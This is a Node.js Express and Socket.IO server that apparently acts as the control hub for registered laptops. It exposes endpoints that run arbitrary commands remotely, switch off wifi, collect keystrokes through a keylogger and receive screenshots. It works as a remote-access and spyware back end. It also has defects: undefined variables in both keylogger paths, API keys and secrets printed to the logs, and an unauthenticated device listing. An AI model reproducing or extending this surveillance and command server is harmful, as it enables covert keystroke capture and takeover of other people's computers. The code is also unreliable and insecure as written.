import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import http from "http";
import multer from "multer";
import { Server } from "socket.io";
import path from "path";
import fs from "fs";

dotenv.config();
const app = express();
app.use(express.json({ limit: "200mb" })); // Increase JSON payload limit

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io",
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
  transports: ["websocket", "polling"],
  pingTimeout: 60000, // Increased timeout
  pingInterval: 30000, // Increased interval
  maxHttpBufferSize: 1e8, // Increase buffer size
});

// For Storing connected clients data
const connectedLaptops = new Map();

app.use(
  cors({
    origin: [
      "http://localhost:5173",
      "https://wifi-control-frontend.vercel.app",
    ],
    methods: ["GET", "POST"],
    credentials: true,
  }),
);

const uploadDir = path.join(process.cwd(), "screenshots");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Configure multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueName = `screenshot-${Date.now()}${path.extname(file.originalname)}`;
    cb(null, uniqueName);
  },
});
const upload = multer({ storage });

// POST /upload
app.post("/api/upload", upload.single("file"), (req, res) => {
  if (!req.file) {
    return res
      .status(400)
      .json({ success: false, message: "No file uploaded" });
  }

  const fileUrl = `${req.protocol}://${req.get("host")}/uploads/${req.file.filename}`;
  res.json({ success: true, url: fileUrl });
});

// Middleware to check API key
const checkApiKey = (req, res, next) => {
  const apiKey = req.headers["x-api-key"];
  console.log("API Key received:", apiKey); // Detailed logging
  console.log("Expected API Key:", process.env.API_KEY); // Log expected key

  if (!apiKey || apiKey !== process.env.API_KEY) {
    console.log("API Key validation failed"); // Logging
    return res.status(401).json({ success: false, message: "Unauthorized" });
  }
  next();
};

// API endpoint to list connected laptops
app.get("/api/laptops", (req, res) => {
  const laptopList = Array.from(connectedLaptops.keys()).map((id) => {
    return {
      id,
      name: connectedLaptops.get(id).name,
      connectionTime: connectedLaptops.get(id).connectionTime,
    };
  });
  res.json({ status: true, laptops: laptopList });
});

// API endpoint to turn off wifi
app.post("/api/control/wifi/off", checkApiKey, (req, res) => {
  const { laptopId, type, timer } = req.body;

  if (!laptopId) {
    return res
      .status(400)
      .json({ status: false, message: "Laptop ID is required" });
  }

  const laptop = connectedLaptops.get(laptopId);
  if (!laptop) {
    return res
      .status(404)
      .json({ success: false, message: "Laptop not found or not connected" });
  }

  const requestId = Date.now().toString();
  laptop.pendingRequests.set(requestId, { res, timestamp: Date.now() });

  // Timeout handling
  setTimeout(() => {
    const pending = laptop.pendingRequests.get(requestId);
    if (pending) {
      laptop.pendingRequests.delete(requestId);
      pending.res
        .status(408)
        .json({ status: false, message: "Request timed out" });
    }
  }, 30000);

  console.log(type);
  // ✅ Emit only once with requestId
  io.to(laptopId).emit("command", { type: type, timer, requestId });
});

// API endpoint to execute command
app.post("/api/control/execute", checkApiKey, (req, res) => {
  const { laptopId, command } = req.body;

  console.log("Received execute request:", { laptopId, command }); // Enhanced logging

  if (!laptopId || !command) {
    console.log("Missing laptopId or command"); // Logging
    return res
      .status(400)
      .json({ success: false, message: "Laptop ID and command are required" });
  }

  const laptop = connectedLaptops.get(laptopId);
  if (!laptop) {
    console.log(`Laptop ${laptopId} not found or not connected`); // Logging
    return res
      .status(404)
      .json({ success: false, message: "Laptop not found or not connected" });
  }

  // Store the pending request to track response
  const requestId = Date.now().toString();
  laptop.pendingRequests.set(requestId, { res, timestamp: Date.now() });

  // Set timeout for request
  setTimeout(() => {
    const pendingRequest = laptop.pendingRequests.get(requestId);
    if (pendingRequest) {
      laptop.pendingRequests.delete(requestId);
      pendingRequest.res
        .status(408)
        .json({ success: false, message: "Request timed out" });
    }
  }, 10000);

  // Send command to the specific laptop
  console.log(`Emitting command to laptop ${laptopId}`); // Logging
  io.to(laptopId).emit("command", {
    type: "execute",
    command,
    requestId,
  });
});

// API endpoint to take a keylogger tracking

app.post("/api/control/keylogger", checkApiKey, async (req, res) => {
  try {
    const { laptopId, duration = 5000 } = req.body;

    if (!laptopId) {
      return res
        .status(400)
        .json({ success: false, message: "Laptop ID is required" });
    }

    const laptop = connectedLaptops.get(laptopId);
    if (!laptop) {
      return res
        .status(404)
        .json({ success: false, message: "Laptop not found or not connected" });
    }

    const requestId = Date.now().toString();
    const collectedKeys = [];

    // Register listener for incoming keys
    const keyListener = (data) => {
      if (data && data.requestId === requestId) {
        collectedKeys.push({
          key: data.key,
          keycode: data.keycode,
          timestamp: data.timestamp,
        });
      }
    };

    // Attach listener temporarily
    socket.on("keylog", keyListener);

    // Start keylogger on laptop
    io.to(laptopId).emit("command", {
      type: "keylog-start",
      requestId,
    });

    // Stop keylogger and respond after duration
    setTimeout(() => {
      try {
        socket.off("keylog", keyListener); // Remove listener

        // Stop keylogger on laptop
        io.to(laptopId).emit("command", {
          type: "keylog-stop",
          requestId,
        });

        res.json({
          success: true,
          message: `Captured ${collectedKeys.length} keys`,
          keys: collectedKeys,
        });
      } catch (timeoutErr) {
        console.error("Error during keylog timeout block:", timeoutErr);
        res.status(500).json({
          success: false,
          message: "Failed to complete keylogging",
        });
      }
    }, duration);
  } catch (err) {
    console.error("Keylogger error:", err);
    res.status(500).json({
      success: false,
      message: "Internal server error during keylogging",
    });
  }
});

io.on("connection", (socket) => {
  console.log("New client connected:", socket.id);

  // Handle laptop registration
  socket.on("register", (data) => {
    const { name, secret } = data;

    console.log("Registration attempt:", { name, secret }); // Logging
    console.log("Expected secret:", process.env.LAPTOP_SECRET); // Logging

    // Verify registration secret (simple authentication)
    if (secret !== process.env.LAPTOP_SECRET) {
      console.log("Invalid registration secret");
      socket.disconnect();
      return;
    }

    console.log(`Laptop registered: ${name} (${socket.id})`);

    // Store laptop info
    connectedLaptops.set(socket.id, {
      name,
      socket,
      connectionTime: new Date(),
      pendingRequests: new Map(),
    });

    // Send confirmation
    socket.emit("registered", { id: socket.id });
  });

  socket.on("commandResponse", (data) => {
    const { requestId, success, message, output } = data;
    console.log("Received command response:", data); // Logging

    const laptop = connectedLaptops.get(socket.id);

    if (laptop && laptop.pendingRequests.has(requestId)) {
      const { res } = laptop.pendingRequests.get(requestId);
      laptop.pendingRequests.delete(requestId);

      // Send the response back to the original request
      res.json({ success, message, output });
    } else {
      console.log("No matching pending request found"); // Logging
    }
  });

  // keylogger socket
  socket.on("keylogger", (data) => {
    const { key, timestamp } = data;
    console.log(`Key pressed: ${key} at ${timestamp}`); // Log key pressed
    const laptop = connectedLaptops.get(socket.id);
    if (laptop && laptop.pendingRequests.has(requestId)) {
      const { res } = laptop.pendingRequests.get(requestId);
      laptop.pendingRequests.delete(requestId);
      // Send the keylogger data back to the original request
      res.json({ success: true, key, timestamp });
    } else {
      console.log("No key matching pending request found");
    }
  });

  // Enhanced disconnection handling
  socket.on("disconnect", (reason) => {
    console.log(`Client disconnected: ${socket.id}, Reason: ${reason}`);

    // Clean up any pending requests
    const laptop = connectedLaptops.get(socket.id);
    if (laptop) {
      laptop.pendingRequests.forEach((pendingRequest) => {
        pendingRequest.res.status(500).json({
          success: false,
          message: "Laptop disconnected unexpectedly",
        });
      });
    }

    connectedLaptops.delete(socket.id);
  });
});

const PORT = process.env.PORT || 3001;

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
